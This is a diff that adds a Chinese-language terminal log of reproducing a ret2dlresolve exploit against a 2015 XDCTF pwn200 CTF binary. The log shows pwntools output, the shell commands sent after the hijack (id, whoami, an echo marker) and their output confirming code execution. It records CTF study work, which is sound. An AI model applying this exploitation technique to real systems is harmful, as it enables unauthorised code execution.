@@ -1,0 +1,17 @@
+复现实验终端记录 | ret2dlresolve
+命令：python3 ret2dlresolve_repro/exploit.py（交互阶段发送 id; whoami; echo RET2DLRESOLVE_EVIDENCE_OK）
+结果：通过（exit=0）
+
+[*] Loaded 10 cached gadgets for '/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
+[x] Starting local process '/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
+[+] Starting local process '/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32': pid 26429
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 133B
+[x] Receiving all data: 137B
+[x] Receiving all data: 163B
+[+] Receiving all data: Done (163B)
+[*] Process '/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32' stopped with exit code -11 (SIGSEGV) (pid 26429)
+用户id=1000(xyx) 组id=1000(xyx) 组=1000(xyx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
+xyx
+RET2DLRESOLVE_EVIDENCE_OK
